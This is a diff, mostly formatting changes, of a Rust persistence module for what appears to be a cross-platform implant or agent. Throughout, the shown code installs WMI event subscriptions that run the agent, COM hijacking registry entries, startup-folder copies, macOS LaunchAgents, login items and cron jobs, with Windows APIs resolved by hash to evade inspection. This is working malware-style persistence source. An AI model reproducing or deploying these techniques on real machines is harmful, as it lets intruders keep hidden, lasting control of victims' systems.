             log::warn!(
                 "WmiSubscription: vtable[0] ({:p}) and vtable[16] ({:p}) are in different \
                  modules; possible hook detected — refusing hardcoded SpawnInstance index",
-                hmod_0, hmod_16
+                hmod_0,
+                hmod_16
             );
             return None;
         }
@@ -893,7 +1093,9 @@ pub mod windows {
             if !succeeded(hr) {
                 log::warn!(
                     "WmiSubscription: GetObject({}) attempt {} failed: 0x{:08X}",
-                    class_name, attempt + 1, hr
+                    class_name,
+                    attempt + 1,
+                    hr
                 );
                 continue;
             }
@@ -908,13 +1110,16 @@ pub mod windows {
                     if succeeded(hr) && !inst.is_null() {
                         log::debug!(
                             "WmiSubscription: SpawnInstance({}) succeeded on attempt {}",
-                            class_name, attempt + 1
+                            class_name,
+                            attempt + 1
                         );
                         return Ok(inst);
                     }
                     log::warn!(
                         "WmiSubscription: SpawnInstance({}) attempt {} failed: 0x{:08X}",
-                        class_name, attempt + 1, hr
+                        class_name,
+                        attempt + 1,
+                        hr
                     );
                     if !inst.is_null() {
                         ((*(*inst).lpvtbl).release)(inst);
@@ -924,7 +1129,8 @@ pub mod windows {
                     ((*(*class_obj).lpvtbl).release)(class_obj);
                     log::warn!(
                         "WmiSubscription: vtable validation failed for {} on attempt {}",
-                        class_name, attempt + 1
+                        class_name,
+                        attempt + 1
                     );
                 }
             }
@@ -932,7 +1138,8 @@ pub mod windows {
 
         Err(anyhow!(
             "SpawnInstance({}) failed after {} retries",
-            class_name, max_retries
+            class_name,
+            max_retries
         ))
     }
 
@@ -962,14 +1169,12 @@ pub mod windows {
         if !succeeded(hr) {
             return Err(anyhow!(
                 "GetObject(path={}) fallback failed: 0x{:08X}",
-                object_path, hr
+                object_path,
+                hr
             ));
         }
         if obj.is_null() {
-            return Err(anyhow!(
-                "GetObject(path={}) returned null",
-                object_path
-            ));
+            return Err(anyhow!("GetObject(path={}) returned null", object_path));
         }
         Ok(obj)
     }
@@ -977,10 +1182,7 @@ pub mod windows {
     // Core COM implementation: returns Ok(()) on success, Err with HR description on failure.
     // Uses robust retry logic for SpawnInstance and falls back to GetObject-by-path + PutInstance
     // if SpawnInstance fails after all retries.
-    unsafe fn wmi_install_com(
-        subscription_name: &str,
-        exe_path: &str,
-    ) -> Result<()> {
+    unsafe fn wmi_install_com(subscription_name: &str, exe_path: &str) -> Result<()> {
         use crate::win_types::succeeded;
         // COM security constants
         const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
@@ -990,12 +1192,12 @@ pub mod windows {
         const CLSCTX_INPROC_SERVER: u32 = 1;
 
         // Resolve COM APIs dynamically
-        let co_create: FnCoCreateInstance = resolve_api_or_load(
-            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COCREATEINSTANCE,
-        ).ok_or_else(|| anyhow!("wmi_install_com: failed to resolve CoCreateInstance"))?;
-        let co_set_blanket: FnCoSetProxyBlanket = resolve_api_or_load(
-            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET,
-        ).ok_or_else(|| anyhow!("wmi_install_com: failed to resolve CoSetProxyBlanket"))?;
+        let co_create: FnCoCreateInstance =
+            resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COCREATEINSTANCE)
+                .ok_or_else(|| anyhow!("wmi_install_com: failed to resolve CoCreateInstance"))?;
+        let co_set_blanket: FnCoSetProxyBlanket =
+            resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET)
+                .ok_or_else(|| anyhow!("wmi_install_com: failed to resolve CoSetProxyBlanket"))?;
 
         // Step 1: CoCreateInstance(CLSID_WbemLocator)
         let mut locator_ptr: *mut IWbemLocator = ptr::null_mut();
@@ -1007,7 +1209,10 @@ pub mod windows {
             &mut locator_ptr as *mut _ as *mut *mut std::ffi::c_void,
         );
         if !succeeded(hr) {
-            return Err(anyhow!("CoCreateInstance(WbemLocator) failed: 0x{:08X}", hr));
+            return Err(anyhow!(
+                "CoCreateInstance(WbemLocator) failed: 0x{:08X}",
+                hr
+            ));
         }
         let locator = &mut *locator_ptr;
 
@@ -1071,7 +1276,8 @@ pub mod windows {
             Err(e) => {
                 log::warn!(
                     "WmiSubscription: SpawnInstance(__EventFilter) failed ({}), \
-                     trying GetObject-by-path fallback", e
+                     trying GetObject-by-path fallback",
+                    e
                 );
                 // Fallback: get instance by object path
                 let filter_path = format!("__EventFilter.Name=\"{}\"", subscription_name);
@@ -1092,23 +1298,36 @@ pub mod windows {
         put_bstr_prop(filter_inst, "Query", filter_query);
 
         let hr = ((*(*services_ptr).lpvtbl).put_instance)(
-            services_ptr, filter_inst, WBEM_FLAG_CREATE_OR_UPDATE,
-            ptr::null_mut(), ptr::null_mut(),
+            services_ptr,
+            filter_inst,
+            WBEM_FLAG_CREATE_OR_UPDATE,
+            ptr::null_mut(),
+            ptr::null_mut(),
         );
         ((*(*filter_inst).lpvtbl).release)(filter_inst);
         if !succeeded(hr) {
-            cleanup_and_err!(services_ptr, locator_ptr, "PutInstance(__EventFilter) failed: 0x{:08X}", hr);
+            cleanup_and_err!(
+                services_ptr,
+                locator_ptr,
+                "PutInstance(__EventFilter) failed: 0x{:08X}",
+                hr
+            );
         }
 
         // ── Step 4b: CommandLineEventConsumer ───────────────────────────────
-        let consumer_inst = match spawn_instance_with_retry(services_ptr, "CommandLineEventConsumer") {
+        let consumer_inst = match spawn_instance_with_retry(
+            services_ptr,
+            "CommandLineEventConsumer",
+        ) {
             Ok(inst) => inst,
             Err(e) => {
                 log::warn!(
                     "WmiSubscription: SpawnInstance(CommandLineEventConsumer) failed ({}), \
-                     trying GetObject-by-path fallback", e
+                     trying GetObject-by-path fallback",
+                    e
                 );
-                let consumer_path = format!("CommandLineEventConsumer.Name=\"{}\"", subscription_name);
+                let consumer_path =
+                    format!("CommandLineEventConsumer.Name=\"{}\"", subscription_name);
                 match get_instance_by_path(services_ptr, &consumer_path) {
                     Ok(inst) => inst,
                     Err(e2) => cleanup_and_err!(
@@ -1124,21 +1343,33 @@ pub mod windows {
         put_bstr_prop(consumer_inst, "CommandLineTemplate", exe_path);
 
         let hr = ((*(*services_ptr).lpvtbl).put_instance)(
-            services_ptr, consumer_inst, WBEM_FLAG_CREATE_OR_UPDATE,
-            ptr::null_mut(), ptr::null_mut(),
+            services_ptr,
+            consumer_inst,
+            WBEM_FLAG_CREATE_OR_UPDATE,
+            ptr::null_mut(),
+            ptr::null_mut(),
         );
         ((*(*consumer_inst).lpvtbl).release)(consumer_inst);
         if !succeeded(hr) {
-            cleanup_and_err!(services_ptr, locator_ptr, "PutInstance(CommandLineEventConsumer) failed: 0x{:08X}", hr);
+            cleanup_and_err!(
+                services_ptr,
+                locator_ptr,
+                "PutInstance(CommandLineEventConsumer) failed: 0x{:08X}",
+                hr
+            );
         }
 
         // ── Step 4c: __FilterToConsumerBinding ──────────────────────────────
-        let binding_inst = match spawn_instance_with_retry(services_ptr, "__FilterToConsumerBinding") {
+        let binding_inst = match spawn_instance_with_retry(
+            services_ptr,
+            "__FilterToConsumerBinding",
+        ) {
             Ok(inst) => inst,
             Err(e) => {
                 log::warn!(
                     "WmiSubscription: SpawnInstance(__FilterToConsumerBinding) failed ({}), \
-                     trying GetObject-by-path fallback", e
+                     trying GetObject-by-path fallback",
+                    e
                 );
                 let binding_path = format!(
                     "__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{}\\\"\",Consumer=\"CommandLineEventConsumer.Name=\\\"{}\\\"\"",
@@ -1162,15 +1393,21 @@ pub mod windows {
         put_bstr_prop(binding_inst, "Consumer", &consumer_ref);
 
         let hr = ((*(*services_ptr).lpvtbl).put_instance)(
-            services_ptr, binding_inst, WBEM_FLAG_CREATE_OR_UPDATE,
-            ptr::null_mut(), ptr::null_mut(),
+            services_ptr,
+            binding_inst,
+            WBEM_FLAG_CREATE_OR_UPDATE,
+            ptr::null_mut(),
+            ptr::null_mut(),
         );
         ((*(*binding_inst).lpvtbl).release)(binding_inst);
         ((*(*services_ptr).lpvtbl).release)(services_ptr);
         ((*locator.lpvtbl).release)(locator_ptr);
 
         if !succeeded(hr) {
-            return Err(anyhow!("PutInstance(__FilterToConsumerBinding) failed: 0x{:08X}", hr));
+            return Err(anyhow!(
+                "PutInstance(__FilterToConsumerBinding) failed: 0x{:08X}",
+                hr
+            ));
         }
         Ok(())
     }
@@ -1190,12 +1427,12 @@ pub mod windows {
         const CLSCTX_INPROC_SERVER: u32 = 1;
 
         // Resolve COM APIs dynamically
-        let co_create: FnCoCreateInstance = resolve_api_or_load(
-            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COCREATEINSTANCE,
-        ).ok_or_else(|| anyhow!("wmi_connect: failed to resolve CoCreateInstance"))?;
-        let co_set_blanket: FnCoSetProxyBlanket = resolve_api_or_load(
-            OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET,
-        ).ok_or_else(|| anyhow!("wmi_connect: failed to resolve CoSetProxyBlanket"))?;
+        let co_create: FnCoCreateInstance =
+            resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COCREATEINSTANCE)
+                .ok_or_else(|| anyhow!("wmi_connect: failed to resolve CoCreateInstance"))?;
+        let co_set_blanket: FnCoSetProxyBlanket =
+            resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COSETPROXYBLANKET)
+                .ok_or_else(|| anyhow!("wmi_connect: failed to resolve CoSetProxyBlanket"))?;
 
         let mut locator_ptr: *mut IWbemLocator = ptr::null_mut();
         let hr = co_create(
@@ -1206,7 +1443,10 @@ pub mod windows {
             &mut locator_ptr as *mut _ as *mut *mut std::ffi::c_void,
         );
         if !succeeded(hr) {
-            return Err(anyhow!("CoCreateInstance(WbemLocator) failed: 0x{:08X}", hr));
+            return Err(anyhow!(
+                "CoCreateInstance(WbemLocator) failed: 0x{:08X}",
+                hr
+            ));
         }
 
         let ns_bstr = ComBstr::new("root\\subscription")
@@ -1264,12 +1504,21 @@ pub mod windows {
         //   2. CommandLineEventConsumer
         //   3. __EventFilter
         let classes_and_keys: &[(&str, &str)] = &[
-            ("__FilterToConsumerBinding",
-             &format!("__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{}\\\"\"", subscription_name)),
-            ("CommandLineEventConsumer",
-             &format!("CommandLineEventConsumer.Name=\"{}\"", subscription_name)),
-            ("__EventFilter",
-             &format!("__EventFilter.Name=\"{}\"", subscription_name)),
+            (
+                "__FilterToConsumerBinding",
+                &format!(
+                    "__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{}\\\"\"",
+                    subscription_name
+                ),
+            ),
+            (
+                "CommandLineEventConsumer",
+                &format!("CommandLineEventConsumer.Name=\"{}\"", subscription_name),
+            ),
+            (
+                "__EventFilter",
+                &format!("__EventFilter.Name=\"{}\"", subscription_name),
+            ),
         ];
 
         let wql_bstr = match ComBstr::new("WQL") {
@@ -1283,7 +1532,10 @@ pub mod windows {
 
         for &(class, _key_path) in classes_and_keys {
             // Query for instances of this class matching the subscription name.
-            let query = format!("SELECT * FROM {} WHERE Name = '{}'", class, subscription_name);
+            let query = format!(
+                "SELECT * FROM {} WHERE Name = '{}'",
+                class, subscription_name
+            );
             let query_bstr = match ComBstr::new(&query) {
                 Some(b) => b,
                 None => continue,
@@ -1348,7 +1600,8 @@ pub mod windows {
                 if !succeeded(del_hr) {
                     log::warn!(
                         "WmiSubscription::remove: DeleteInstance('{}') failed: 0x{:08X}",
-                        path_str, del_hr
+                        path_str,
+                        del_hr
                     );
                 }
             }
@@ -1406,13 +1659,8 @@ pub mod windows {
         let found = if succeeded(hr) && !enum_ptr.is_null() {
             let mut obj: *mut IWbemClassObject = ptr::null_mut();
             let mut returned: u32 = 0;
-            let next_hr = ((*(*enum_ptr).lpvtbl).next)(
-                enum_ptr,
-                WBEM_INFINITE,
-                1,
-                &mut obj,
-                &mut returned,
-            );
+            let next_hr =
+                ((*(*enum_ptr).lpvtbl).next)(enum_ptr, WBEM_INFINITE, 1, &mut obj, &mut returned);
             if next_hr == S_OK && returned > 0 {
                 ((*(*obj).lpvtbl).release)(obj);
                 true
@@ -1458,12 +1706,16 @@ pub mod windows {
 
             unsafe {
                 const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
-                let co_init: FnCoInitializeEx = resolve_api_or_load(
-                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX,
-                ).ok_or_else(|| anyhow!("WmiSubscription::install: failed to resolve CoInitializeEx"))?;
-                let co_uninit: FnCoUninitialize = resolve_api_or_load(
-                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE,
-                ).ok_or_else(|| anyhow!("WmiSubscription::install: failed to resolve CoUninitialize"))?;
+                let co_init: FnCoInitializeEx =
+                    resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX)
+                        .ok_or_else(|| {
+                            anyhow!("WmiSubscription::install: failed to resolve CoInitializeEx")
+                        })?;
+                let co_uninit: FnCoUninitialize =
+                    resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE)
+                        .ok_or_else(|| {
+                            anyhow!("WmiSubscription::install: failed to resolve CoUninitialize")
+                        })?;
 
                 let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
                 // S_OK      — COM initialised successfully; we own it and must
@@ -1510,12 +1762,16 @@ pub mod windows {
 
             unsafe {
                 const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
-                let co_init: FnCoInitializeEx = resolve_api_or_load(
-                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX,
-                ).ok_or_else(|| anyhow!("WmiSubscription::remove: failed to resolve CoInitializeEx"))?;
-                let co_uninit: FnCoUninitialize = resolve_api_or_load(
-                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE,
-                ).ok_or_else(|| anyhow!("WmiSubscription::remove: failed to resolve CoUninitialize"))?;
+                let co_init: FnCoInitializeEx =
+                    resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX)
+                        .ok_or_else(|| {
+                            anyhow!("WmiSubscription::remove: failed to resolve CoInitializeEx")
+                        })?;
+                let co_uninit: FnCoUninitialize =
+                    resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE)
+                        .ok_or_else(|| {
+                            anyhow!("WmiSubscription::remove: failed to resolve CoUninitialize")
+                        })?;
 
                 let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
                 let should_uninitialize = succeeded(hr);
@@ -1548,12 +1804,16 @@ pub mod windows {
 
             unsafe {
                 const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
-                let co_init: FnCoInitializeEx = resolve_api_or_load(
-                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX,
-                ).ok_or_else(|| anyhow!("WmiSubscription::verify: failed to resolve CoInitializeEx"))?;
-                let co_uninit: FnCoUninitialize = resolve_api_or_load(
-                    OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE,
-                ).ok_or_else(|| anyhow!("WmiSubscription::verify: failed to resolve CoUninitialize"))?;
+                let co_init: FnCoInitializeEx =
+                    resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COINITIALIZEEX)
+                        .ok_or_else(|| {
+                            anyhow!("WmiSubscription::verify: failed to resolve CoInitializeEx")
+                        })?;
+                let co_uninit: FnCoUninitialize =
+                    resolve_api_or_load(OLE32_DLL_W, HASH_OLE32_DLL, HASH_COUNINITIALIZE)
+                        .ok_or_else(|| {
+                            anyhow!("WmiSubscription::verify: failed to resolve CoUninitialize")
+                        })?;
 
                 let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
                 let should_uninitialize = succeeded(hr);
@@ -1619,9 +1879,11 @@ pub mod windows {
                 let (_, reg_set, reg_close) = registry_apis().ok_or_else(|| {
                     anyhow!("ComHijacking::install: failed to resolve registry APIs")
                 })?;
-                let reg_create: FnRegCreateKeyExW = resolve_api_or_load(
-                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGCREATEKEYEXW,
-                ).ok_or_else(|| anyhow!("ComHijacking::install: failed to resolve RegCreateKeyExW"))?;
+                let reg_create: FnRegCreateKeyExW =
+                    resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGCREATEKEYEXW)
+                        .ok_or_else(|| {
+                            anyhow!("ComHijacking::install: failed to resolve RegCreateKeyExW")
+                        })?;
 
                 let mut hkey = ptr::null_mut();
                 let ret = reg_create(
@@ -1677,9 +1939,11 @@ pub mod windows {
                 .encode_utf16()
                 .collect();
             unsafe {
-                let reg_delete_tree: FnRegDeleteTreeW = resolve_api_or_load(
-                    ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGDELETETREEW,
-                ).ok_or_else(|| anyhow!("ComHijacking::remove: failed to resolve RegDeleteTreeW"))?;
+                let reg_delete_tree: FnRegDeleteTreeW =
+                    resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_REGDELETETREEW)
+                        .ok_or_else(|| {
+                            anyhow!("ComHijacking::remove: failed to resolve RegDeleteTreeW")
+                        })?;
                 reg_delete_tree(HKEY_CURRENT_USER, subkey.as_ptr());
             }
             log::info!("ComHijacking::remove: removed CLSID {}", self.clsid);
@@ -1733,7 +1997,8 @@ pub mod windows {
 
     impl Persist for StartupFolder {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            let target = self.startup_path()
+            let target = self
+                .startup_path()
                 .ok_or_else(|| anyhow!("StartupFolder: no config dir"))?;
             std::fs::copy(executable_path, &target)
                 .map_err(|e| anyhow!("StartupFolder::install: copy failed: {}", e))?;
@@ -1830,9 +2095,9 @@ pub mod windows {
             // the file extension check inside ComHijacking::install() would always
             // reject the path — skip early and log the reason instead of emitting
             // a misleading "install failed" warning.
-            let is_dll = exe.extension().map_or(false, |ext| {
-                ext.eq_ignore_ascii_case("dll")
-            });
+            let is_dll = exe
+                .extension()
+                .map_or(false, |ext| ext.eq_ignore_ascii_case("dll"));
             if !is_dll {
                 let msg = format!(
                     "ComHijacking: skipping — agent binary is '{}' (not a DLL); \
@@ -1899,7 +2164,7 @@ pub mod windows {
 pub use macos::*;
 #[cfg(target_os = "macos")]
 pub mod macos {
-    use super::{Persist, shell_quote_single};
+    use super::{shell_quote_single, Persist};
     use anyhow::{anyhow, Result};
     use std::path::{Path, PathBuf};
 
@@ -1910,12 +2175,12 @@ pub mod macos {
         let mut out = String::with_capacity(s.len());
         for ch in s.chars() {
             match ch {
-                '&'  => out.push_str("&amp;"),
-                '<'  => out.push_str("&lt;"),
-                '>'  => out.push_str("&gt;"),
-                '"'  => out.push_str("&quot;"),
+                '&' => out.push_str("&amp;"),
+                '<' => out.push_str("&lt;"),
+                '>' => out.push_str("&gt;"),
+                '"' => out.push_str("&quot;"),
                 '\'' => out.push_str("&apos;"),
-                c    => out.push(c),
+                c => out.push(c),
             }
         }
         out
@@ -1989,18 +2254,28 @@ pub mod macos {
                 if self.asuser_bootstrap {
                     // GUI-session bootstrap via launchctl asuser (LoginItem pattern).
                     let _ = std::process::Command::new("launchctl")
-                        .arg("asuser").arg(&uid_str)
-                        .arg("launchctl").arg("bootout")
-                        .arg(&gui_domain).arg(&plist_path)
+                        .arg("asuser")
+                        .arg(&uid_str)
+                        .arg("launchctl")
+                        .arg("bootout")
+                        .arg(&gui_domain)
+                        .arg(&plist_path)
                         .status();
                     let bootstrap = std::process::Command::new("launchctl")
-                        .arg("asuser").arg(&uid_str)
-                        .arg("launchctl").arg("bootstrap")
-                        .arg(&gui_domain).arg(&plist_path)
+                        .arg("asuser")
+                        .arg(&uid_str)
+                        .arg("launchctl")
+                        .arg("bootstrap")
+                        .arg(&gui_domain)
+                        .arg(&plist_path)
                         .output()
-                        .map_err(|e| anyhow!("LaunchAgent::install: launchctl asuser bootstrap: {}", e))?;
+                        .map_err(|e| {
+                            anyhow!("LaunchAgent::install: launchctl asuser bootstrap: {}", e)
+                        })?;
                     if !bootstrap.status.success() {
-                        let stderr = String::from_utf8_lossy(&bootstrap.stderr).trim().to_string();
+                        let stderr = String::from_utf8_lossy(&bootstrap.stderr)
+                            .trim()
+                            .to_string();
                         let detail = if stderr.is_empty() {
                             "no stderr output".to_string()
                         } else {
@@ -2014,11 +2289,7 @@ pub mod macos {
                     }
                 } else {
                     let status = std::process::Command::new("launchctl")
-                        .args([
-                            "bootstrap",
-                            &gui_domain,
-                            &plist_path.to_string_lossy(),
-                        ])
+                        .args(["bootstrap", &gui_domain, &plist_path.to_string_lossy()])
                         .status()
                         .map_err(|e| anyhow!("LaunchAgent::install: launchctl: {}", e))?;
                     if !status.success() {
@@ -2054,9 +2325,12 @@ pub mod macos {
                 let gui_domain = format!("gui/{uid}");
                 if self.asuser_bootstrap {
                     let _ = std::process::Command::new("launchctl")
-                        .arg("asuser").arg(&uid_str)
-                        .arg("launchctl").arg("bootout")
-                        .arg(&gui_domain).arg(&plist_path)
+                        .arg("asuser")
+                        .arg(&uid_str)
+                        .arg("launchctl")
+                        .arg("bootout")
+                        .arg(&gui_domain)
+                        .arg(&plist_path)
                         .status();
                 } else {
                     let _ = std::process::Command::new("launchctl")
@@ -2125,9 +2399,7 @@ pub mod macos {
         /// Run `crontab -l` and return its stdout, or an empty string if the
         /// user has no crontab (exit 1 from crontab is "no crontab for user").
         fn read_crontab() -> String {
-            let output = std::process::Command::new("crontab")
-                .arg("-l")
-                .output();
+            let output = std::process::Command::new("crontab").arg("-l").output();
             match output {
                 Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout).into_owned(),
                 Ok(_) => {
@@ -2177,9 +2449,9 @@ pub mod macos {
             if let Some(mut stdin) = child.stdin.take() {
                 let _ = stdin.write_all(new_crontab.as_bytes());
             }
-            let status = child.wait().map_err(|e| {
-                anyhow!("CronJob::install: failed to wait for crontab: {e}")
-            })?;
+            let status = child
+                .wait()
+                .map_err(|e| anyhow!("CronJob::install: failed to wait for crontab: {e}"))?;
             if !status.success() {
                 return Err(anyhow!(
                     "CronJob::install: crontab - exited with status {status}; \
@@ -2236,16 +2508,14 @@ pub mod macos {
                     .stdout(std::process::Stdio::piped())
                     .stderr(std::process::Stdio::piped())
                     .spawn()
-                    .map_err(|e| {
-                        anyhow!("CronJob::remove: failed to spawn crontab: {e}")
-                    })?;
+                    .map_err(|e| anyhow!("CronJob::remove: failed to spawn crontab: {e}"))?;
                 use std::io::Write;
                 if let Some(mut stdin) = child.stdin.take() {
                     let _ = stdin.write_all(new_crontab.as_bytes());
                 }
-                child.wait().map_err(|e| {
-                    anyhow!("CronJob::remove: failed to wait for crontab: {e}")
-                })?;
+                child
+                    .wait()
+                    .map_err(|e| anyhow!("CronJob::remove: failed to wait for crontab: {e}"))?;
             }
 
             log::info!("CronJob::remove: cron entry removed");
@@ -2270,9 +2540,7 @@ pub mod macos {
     /// Install both LaunchAgent (preferred) and cron fallback.
     pub fn install_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        let cfg = crate::config::load_config()
-            .unwrap_or_default()
-            .persistence;
+        let cfg = crate::config::load_config().unwrap_or_default().persistence;
 
         let mut attempted = 0usize;
         let mut succeeded = 0usize;
@@ -2717,18 +2985,22 @@ pub mod macos {
                 .map_err(|e| {
                     anyhow!(
                         "LoginItem: servicectl {} '{}': {}",
-                        action, helper_bundle_id, e
+                        action,
+                        helper_bundle_id,
+                        e
                     )
                 })?;
             if !status.success() {
                 return Err(anyhow!(
                     "LoginItem: servicectl {} '{}' returned non-zero exit status",
-                    action, helper_bundle_id
+                    action,
+                    helper_bundle_id
                 ));
             }
             log::info!(
                 "LoginItem: servicectl {} '{}' succeeded",
-                action, helper_bundle_id
+                action,
+                helper_bundle_id
             );
             Ok(())
         }
@@ -2866,8 +3138,7 @@ end tell"#
             }
 
             let reported_path = PathBuf::from(reported);
-            let reported_canonical =
-                std::fs::canonicalize(&reported_path).unwrap_or(reported_path);
+            let reported_canonical = std::fs::canonicalize(&reported_path).unwrap_or(reported_path);
             Ok(reported_canonical == expected)
         }
 
@@ -2950,7 +3221,7 @@ end tell"#
 pub use linux::*;
 #[cfg(target_os = "linux")]
 pub mod linux {
-    use super::{Persist, shell_quote_single};
+    use super::{shell_quote_single, Persist};
     use anyhow::{anyhow, Result};
     use std::io::Write;
     use std::path::PathBuf;
@@ -3189,9 +3460,7 @@ pub mod linux {
     /// platform-specific failure modes.
     pub fn install_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        let cfg = crate::config::load_config()
-            .unwrap_or_default()
-            .persistence;
+        let cfg = crate::config::load_config().unwrap_or_default().persistence;
 
         let mut attempted = 0usize;
         let mut succeeded = 0usize;
